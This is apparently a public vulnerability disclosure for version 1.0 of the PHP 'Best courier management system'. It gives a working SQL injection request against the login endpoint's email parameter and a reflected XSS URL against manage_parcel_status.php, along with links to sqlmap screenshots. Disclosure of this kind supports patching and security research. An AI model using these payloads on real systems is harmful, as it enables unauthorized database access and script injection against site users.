### Exploit Title: Best courier management system - Multiple vulnerabilities
### Date: 2024-02/23
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/16848/best-courier-management-system-project-php.html
### Version: 1.0
### Tested on: windows10 + phpstudy

# 1./ajax.php?action=login（SQL injections）
/ajax.php?action=login SQL injection exists for parameter email

### Sample request POC #1

```
POST /ajax.php?action=login HTTP/1.1
Host: localhost:8889
Content-Length: 36
sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
sec-ch-ua-platform: "macOS"
Origin: http://localhost:8889
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8889/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=0sk1vejv5ipjkga2afjt5vqi59
Connection: close

email=admin@qq.com' AND GTID_SUBSET(CONCAT(0x7170707a71,(SELECT (ELT(8602=8602,1))),0x71786b6271),8602)-- DXLq&password=123456
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708683277496.jpg "Best courier management system")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708683386418.jpg "Best courier management system")


# 2./manage_parcel_status.php（XSS）
/manage_parcel_status.php XSS exists for parameter id

### Sample request POC #2

```
http://localhost:8889/manage_parcel_status.php?id=1%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708683733074.jpg "Best courier management system")


